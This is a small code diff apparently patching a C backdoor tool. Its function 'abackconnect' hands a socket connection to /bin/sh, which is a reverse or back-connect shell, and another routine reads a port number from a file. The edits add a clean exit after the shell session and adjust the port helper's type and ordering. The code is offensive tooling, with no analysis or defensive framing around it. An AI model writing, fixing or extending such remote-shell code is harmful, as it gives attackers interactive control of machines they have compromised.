@@ -25,9 +25,10 @@ void abackconnect(int sockfd){
     execl("/bin/sh", "sh", NULL);
     shutdown(sockfd, SHUT_RDWR);
     close(sockfd);
+    exit(0);
 }
 
-int getacceptport(void){
+unsigned short getacceptport(void){
     int port=0;
     FILE *fp;
     char buf[13];
@@ -38,8 +39,9 @@ int getacceptport(void){
         fclose(fp);
         return 0;
     }
-    port = atoi(buf);
     fclose(fp);
+    port = atoi(buf);
+    
     return port;
 }
 
